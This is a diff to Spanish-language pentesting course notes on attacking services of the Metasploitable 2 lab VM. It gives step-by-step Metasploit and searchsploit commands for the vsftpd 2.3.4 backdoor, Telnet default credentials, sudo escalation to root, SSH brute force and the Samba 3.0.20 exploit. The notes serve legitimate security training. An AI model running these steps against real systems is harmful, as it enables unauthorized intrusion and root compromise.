@@ -188,6 +188,146 @@ select * from users;
 
 ---
 
+## ⑧ Puerto 21 — FTP: tres vectores (clase 25.05)
+
+El FTP de Metasploitable 2 usa **vsftpd 2.3.4** (detectada con `nmap -sC`), con backdoor conocida desde 2011 (ExploitDB + módulo Metasploit).
+
+### Vector 1 — Sesión anónima
+
+```bash
+ftp <IP>
+# Usuario: anonymous · sin contraseña
+dir # o ls → listar
+get fichero # descargar
+put fichero # subir
+```
+
+> [!danger] PELIGRO DEL ANÓNIMO
+> Si esa carpeta del FTP está expuesta en la web, se sube una reverse shell en PHP → ejecución de código remoto. El contexto lo cambia todo.
+
+### Vector 2 — Exploit de la versión (Metasploit)
+
+```bash
+msfconsole
+search vsftpd 2.3.4
+use 0
+set RHOSTS <IP>
+set LHOST <KALI>
+run
+# → "backdoor has been spawned" → shell → whoami = root
+```
+
+### Vector 3 — Script Python (sin Metasploit)
+
+```bash
+# SearchSploit muestra el mismo exploit como script
+locate vsftpd
+cp /ruta/completa/al/script.py . # no modificar el original
+python3 script.py <IP>
+
+# Si va demasiado rápido: nano → import time al inicio
+# + time.sleep(2) en la línea de conexión → relanzar
+```
+
+> [!important] IDEA CLAVE (25.05)
+> Para FTP hay **exactamente tres vectores**: sesión anónima, versión vulnerable y credenciales obtenidas por otro medio. Si ninguno aplica, FTP no ofrece más superficie aislada.
+
+---
+
+## ⑨ Puerto 23 — Telnet: credenciales en texto claro
+
+Protocolo de gestión remota similar a SSH pero **sin cifrado**, obsoleto.
+
+```bash
+telnet <IP>
+# Metasploitable 2 muestra usuario y contraseña directamente en pantalla
+# → msfadmin / msfadmin → whoami = msfadmin (no root)
+```
+
+### Escalada desde Telnet (y desde SSH)
+
+```bash
+sudo -l # qué puede ejecutar el usuario con permisos de root
+# En Metasploitable 2: ALL → todo
+
+sudo su
+whoami # → root
+```
+
+> [!tip] METÁFORA DE LAS LLAVES
+> `sudo -l` es revisar qué llaves tiene el usuario. Si tiene la llave maestra (**ALL**), no hay barrera. Si solo tiene la de un almacén, **GTFOBins** te dice cómo usarla para copiar la maestra.
+
+---
+
+## ⑩ Puerto 22 — SSH: fuerza bruta con Metasploit
+
+```bash
+msfconsole
+search ssh/login
+use 0
+set RHOSTS <IP>
+set USER_FILE /ruta/usuarios.txt
+set PASS_FILE /ruta/passwords.txt
+set STOP_ON_SUCCESS true # para al primer acierto
+run
+```
+
+### Gestión de sesiones de Metasploit
+
+```bash
+sessions # listar sesiones guardadas
+sessions 1 # entrar en una sesión
+Ctrl + Z # dejarla en segundo plano sin cerrarla
+```
+
+> [!info] SESIONES PERSISTENTES
+> A diferencia del exploit de FTP (que abría sesión automática), el scanner SSH **no abre shell**: guarda sesión activa en Metasploit. Permite mantener múltiples sesiones simultáneas a diferentes máquinas/usuarios.
+
+Una vez dentro como msfadmin: escalada idéntica a Telnet (`sudo -l` → ALL → `sudo su`).
+
+---
+
+## ⑪ Puertos 139/445 — SMB/Samba en Linux (Metasploitable)
+
+SMB implementado en Linux como **Samba**: carpetas, impresoras, ficheros.
+
+```bash
+# Enumerar recursos compartidos (sesión anónima)
+smbclient -L -N //<IP>/
+# -L = listar recursos · -N = sin credenciales
+# → tmp, opt, C$, etc.
+```
+
+### Obtener la versión de Samba sin Nmap
+
+```bash
+msfconsole
+search smb version
+use 103
+set RHOSTS <IP>
+run
+# → versión exacta de Samba
+```
+
+### Exploit de la versión vulnerable
+
+Metasploitable 2 tiene **Samba 3.0.20** — mismo flujo que FTP:
+
+```bash
+searchsploit Samba 3.0.20
+msfconsole
+search Samba 3.0.20
+use 0
+set RHOSTS <IP>
+run
+# → sesión directamente como root, sin escalada
+```
+
+> [!important] CHECKLIST POR SERVICIO (25.05)
+> SMB: enumerar shares con `smbclient` → identificar versión → `searchsploit` → si hay exploit, usarlo; si no, revisar el contenido de las carpetas en busca de credenciales.
+
+---
+
 ## Checklist de repaso
 
 - [ ] ¿Sé montar un sistema NFS y explorarlo?
@@ -196,6 +336,10 @@ select * from users;
 - [ ] ¿Entiendo la diferencia entre `>>` y `>`?
 - [ ] ¿Sé explotar PostgreSQL y Tomcat?
 - [ ] ¿Reconozco un Command Injection y sé explotarlo?
+- [ ] ¿Sé explotar FTP por los 3 vectores (anónimo, versión, credenciales)?
+- [ ] ¿Sé escalar con `sudo -l` → ALL → `sudo su` desde Telnet/SSH?
+- [ ] ¿Sé hacer fuerza bruta SSH con Metasploit y gestionar sesiones (`sessions`, Ctrl+Z)?
+- [ ] ¿Sé enumerar Samba y obtener su versión sin Nmap?
 
 ---
 
@@ -210,29 +354,23 @@ select * from users;
 
 
 
+
+
 ---
 
 ## 🔗 Red de Conocimiento
 
 ### Documentos Relacionados
 
-- [[../../apuntes evolve/BLOQUE 5.md|BLOQUE 5]] — Linux, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Joselu/PREWORK/resumen_clase13.md|resumen_clase13]] — Linux, Metasploit, Netcat / Reverse Shells
-- [[Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Chema/Introducción a Consolas - Bash y PowerShell.md|Introducción a Consolas - Bash y PowerShell]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[Reverse Shells y Post-Explotación.md|Reverse Shells y Post-Explotación]] — Escalada de Privilegios, Linux, Netcat / Reverse Shells
-- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Escalada de Privilegios, Linux, Netcat / Reverse Shells
+- [[Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
+- [[Reverse Shells y Post-Explotación.md|Reverse Shells y Post-Explotación]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
+- [[../../apuntes evolve/BLOQUE 5.md|BLOQUE 5]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
+- [[../../apuntes Chema/Maquinas/Vaccine.md|Vaccine]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
+- [[../../apuntes Joselu/PREWORK/resumen_clase13.md|resumen_clase13]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/Hydra|Hydra]]
-- [[comandos/John_Hashcat|John / Hashcat]]
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Metasploit|Netcat / Reverse Shells]]
-- [[comandos/SSH|SSH]]
+- [[../../../programacion/Ciberseguridad/wordpress_security.md|wordpress_security]] — Programacion: Criptografia, Linux, SQL
+- [[../../../programacion/Go/testing_go.md|testing_go]] — Programacion: Criptografia, Linux, SQL
 
-### 🎯 Vulnerabilidades Relacionadas
-
-- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
-
-> #command-injection #escalada-privilegios #hack-the-box #hydra #john #linux #metasploit #netcat #pentest #post-explotacion #redes #reverse-shell #ssh #vulnhub #windows
+> #cli #command_injection #crypto #escalada_privilegios #go #hack_the_box #hydra #john_hashcat #linux #linux_ciber #metasploit #netcat #pentest #post_explotacion #redes #redes_ciber #reverse_shell #sql #ssh_tool #vulnhub #windows_ciber
